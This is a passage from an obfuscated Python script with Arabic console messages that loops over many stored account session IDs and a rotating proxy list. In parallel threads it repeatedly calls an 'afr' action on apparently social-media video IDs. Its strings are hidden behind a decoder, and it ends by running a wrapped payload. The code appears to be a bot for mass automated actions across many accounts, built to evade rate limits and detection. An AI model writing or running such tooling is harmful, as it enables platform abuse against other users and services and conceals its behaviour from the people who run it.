\xd8\xad\xd8\xa7\xd9\x84\xd9\x8a\xd8\xa7\xd9\x8b.{RESET}\')\n        return (0, 0, 0)\n    ok_cycle = fail_cycle = calls = 0\n    total = len(ids)\n    print(f\'{BOLD}{CYAN}\xd8\xa8\xd8\xaf\xd8\xa1 \xd9\x82\xd8\xb1\xd8\xa7\xd8\xa1\xd8\xa9 \xd8\xac\xd9\x85\xd9\x8a\xd8\xb9 \xd8\xa7\xd9\x84\xd8\xa3\xd9\x8a\xd8\xaf\xd9\x8a\xd8\xa7\xd8\xaa \xd9\x84\xd9\x84\xd8\xb3\xd9\x8a\xd8\xb4\xd9\x86:{RESET} {sessionid}\')\n    for pos, aweme_id in enumerate(ids, start=1):\n        proxy_url = rotator.next() if rotator else None\n        success = False\n        for attempt in range(1, MAX_RETRY_PER_ID + 1):\n            calls += 1\n            if call_afr_with_proxy(aweme_id, sessionid, proxy_url=proxy_url):\n                ok_cycle += 1\n                success = True\n                break\n            else:\n                fail_cycle += 1\n                time.sleep(0.05)\n        proxy_info = mask_proxy(proxy_url) if proxy_url else __sx__(b\'5EYnLX5aZgeBq0eI8jAkLY1U9CItZfqLnD0ukgA=\', 156)\n        print(f\'{CYAN}[Session:{sessionid[:6]}] ID#{pos}/{total}{RESET} | {GREEN}{ok_cycle}{RESET} {RED}{fail_cycle}{RESET} | Calls:{calls} | Proxy: {proxy_info}\', end=__sx__(b\'9FZviYyMgoyC\', 140))\n        time.sleep(SLEEP_BETWEEN_IDS)\n    print(f\'\\n{GREEN}\xd8\xa7\xd9\x86\xd8\xaa\xd9\x87\xd8\xaa \xd8\xaf\xd9\x81\xd8\xb9\xd8\xa9 \xd8\xa7\xd9\x84\xd8\xb3\xd9\x8a\xd8\xb4\xd9\x86 \xe2\x80\x94 \xd8\xaa\xd9\x85\xd8\xaa \xd9\x85\xd8\xb9\xd8\xa7\xd9\x84\xd8\xac\xd8\xa9 {total} ID \xd8\xa8\xd8\xa7\xd9\x84\xd8\xaa\xd8\xb3\xd9\x84\xd8\xb3\xd9\x84. \xd9\x86\xd8\xac\xd8\xa7\xd8\xad:{ok_cycle} | \xd9\x81\xd8\xb4\xd9\x84:{fail_cycle}{RESET}\')\n    return (ok_cycle, fail_cycle, calls)\n\ndef run_cycle_parallel(sessions, ids, rotator):\n    __sx__(b\'giC3tMP0ecrqFoM/bFsz5fNMbyoL/N46rF7Si+CCMzaV4mHuo5NxY2eZ4SmKOu3BvcA5aaSKydaOMh84ev8zSisLm/YWanfNa8nHGFNmXoaTUYhXrhinCjk71BaxDtW3j4hFy68dpeqB66Q0IqRhCC37LY2Yew==\', 250)\n    workers = MAX_WORKERS or len(sessions)\n    print(f\'{BOLD}{CYAN}\xd8\xaa\xd8\xb4\xd8\xba\xd9\x8a\xd9\x84 \xd9\x85\xd8\xaa\xd9\x88\xd8\xa7\xd8\xb2\xd9\x8a:{RESET} {len(sessions)} \xd8\xb3\xd9\x8a\xd8\xb4\xd9\x86 | \xd8\xb9\xd9\x85\xd9\x91\xd8\xa7\xd9\x84: {workers}\')\n    results = {}\n    with ThreadPoolExecutor(max_workers=workers) as executor:\n        future_map = {executor.submit(run_full_for_session, sid, ids, rotator): sid for sid in sessions}\n        for fut in as_completed(future_map):\n            sid = future_map[fut]\n            try:\n                results[sid] = fut.result()\n            except Exception as e:\n                results[sid] = (0, 0, 0)\n                print(f\'{RED}\xd8\xae\xd8\xb7\xd8\xa3 \xd9\x81\xd9\x8a \xd8\xa7\xd9\x84\xd8\xb3\xd9\x8a\xd8\xb4\xd9\x86 {sid}: {e}{RESET}\')\n    total_ok = sum((r[0] for r in results.values()))\n    total_fail = sum((r[1] for r in results.values()))\n    print(f\'{BOLD}{CYAN}\xd9\x85\xd9\x84\xd8\xae\xd8\xb5 \xd8\xa7\xd9\x84\xd8\xaf\xd9\x88\xd8\xb1\xd8\xa9 \xe2\x80\x94 OK:{total_ok} | FAIL:{total_fail}{RESET}\')\n    return results\n\ndef main():\n    sessions = load_sessions()\n    if not sessions:\n        print(f\'{RED}\xd9\x84\xd8\xa7 \xd9\x8a\xd9\x88\xd8\xac\xd8\xaf \xd8\xb3\xd9\x8a\xd8\xb4\xd9\x86\xd8\xa7\xd8\xaa \xd9\x81\xd9\x8a {SESSIONS_FILE}. \xd8\xa3\xd8\xb6\xd9\x81\xd9\x87\xd8\xa7 \xd8\xab\xd9\x85 \xd8\xb4\xd8\xba\xd9\x91\xd9\x84 \xd9\x85\xd9\x86 \xd8\xac\xd8\xaf\xd9\x8a\xd8\xaf.{RESET}\')\n        return\n    proxies = load_proxies()\n    if not proxies:\n        print(f\'{YELLOW}\xd8\xaa\xd9\x86\xd8\xa8\xd9\x8a\xd9\x87: \xd9\x85\xd9\x84\xd9\x81 {PROXIES_FILE} \xd9\x81\xd8\xa7\xd8\xb1\xd8\xba \xd8\xa3\xd9\x88 \xd8\xba\xd9\x8a\xd8\xb1 \xd9\x85\xd9\x88\xd8\xac\xd9\x88\xd8\xaf \xe2\x80\x94 \xd8\xb3\xd9\x8a\xd8\xaa\xd9\x85 \xd8\xa7\xd9\x84\xd8\xaa\xd8\xb4\xd8\xba\xd9\x8a\xd9\x84 \xd8\xa8\xd8\xaf\xd9\x88\xd9\x86 \xd8\xa8\xd8\xb1\xd9\x88\xd9\x83\xd8\xb3\xd9\x8a.{RESET}\')\n    else:\n        print(f\'{BOLD}{CYAN}\xd8\xaa\xd9\x85 \xd8\xaa\xd8\xad\xd9\x85\xd9\x8a\xd9\x84 {len(proxies)} \xd8\xa8\xd8\xb1\xd9\x88\xd9\x83\xd8\xb3\xd9\x8a.{RESET}\')\n    rotator = ProxyRotator(proxies)\n    while True:\n        ids = load_ids_once()\n        while not ids:\n            print(f\'{YELLOW}\xe2\x9a\xa0 \xd9\x84\xd8\xa7 \xd9\x8a\xd9\x88\xd8\xac\xd8\xaf IDs \xd8\xad\xd8\xa7\xd9\x84\xd9\x8a\xd8\xa7\xd9\x8b\xe2\x80\xa6 \xd8\xb3\xd9\x8a\xd8\xaa\xd9\x85 \xd8\xa7\xd9\x84\xd9\x85\xd8\xad\xd8\xa7\xd9\x88\xd9\x84\xd8\xa9 \xd9\x85\xd8\xac\xd8\xaf\xd8\xaf\xd8\xa7\xd9\x8b.{RESET}\')\n            time.sleep(SLEEP_EMPTY_IDS)\n            ids = load_ids_once()\n        total_ids = len(ids)\n        print(f\'{BOLD}{CYAN}\xd8\xb9\xd8\xaf\xd8\xaf \xd8\xa7\xd9\x84\xd8\xa3\xd9\x8a\xd8\xaf\xd9\x8a\xd8\xa7\xd8\xaa \xd8\xa7\xd9\x84\xd8\xad\xd8\xa7\xd9\x84\xd9\x8a:{RESET} {total_ids}\')\n        try:\n            run_cycle_parallel(sessions, ids, rotator)\n        except KeyboardInterrupt:\n            print(f\'\\n{YELLOW}\xd8\xaa\xd9\x85 \xd8\xa7\xd9\x84\xd8\xa5\xd9\x8a\xd9\x82\xd8\xa7\xd9\x81 \xd8\xa8\xd9\x88\xd8\xa7\xd8\xb3\xd8\xb7\xd8\xa9 \xd8\xa7\xd9\x84\xd9\x85\xd8\xb3\xd8\xaa\xd8\xae\xd8\xaf\xd9\x85.{RESET}\')\n            return\n        except Exception as e:\n            print(f\'{RED}\xd8\xae\xd8\xb7\xd8\xa3 \xd8\xa3\xd8\xab\xd9\x86\xd8\xa7\xd8\xa1 \xd8\xa7\xd9\x84\xd8\xaa\xd8\xb4\xd8\xba\xd9\x8a\xd9\x84 \xd8\xa7\xd9\x84\xd9\x85\xd8\xaa\xd9\x88\xd8\xa7\xd8\xb2\xd9\x8a: {e}{RESET}\')\n        print(f\'{CYAN}\xd8\xa7\xd9\x86\xd8\xaa\xd9\x87\xd8\xaa \xd8\xa7\xd9\x84\xd8\xaf\xd9\x88\xd8\xb1\xd8\xa9. \xd8\xa8\xd8\xaf\xd8\xa1 \xd8\xaf\xd9\x88\xd8\xb1\xd8\xa9 \xd8\xac\xd8\xaf\xd9\x8a\xd8\xaf\xd8\xa9 \xd9\x85\xd9\x86 \xd8\xa7\xd9\x84\xd8\xa8\xd8\xaf\xd8\xa7\xd9\x8a\xd8\xa9\xe2\x80\xa6{RESET}\')\nif __name__ == __sx__(b\'Seu6vv58/f26vjYxPyYyEw==\', 49):\n    try:\n        afr\n    except NameError:\n\n        def afr(aweme_id, sessionid, **kwargs):\n            time.sleep(0.01)\n            return True\n    main()'
    __nasr_check_integrity(__payload)
    __nasr_run_app()
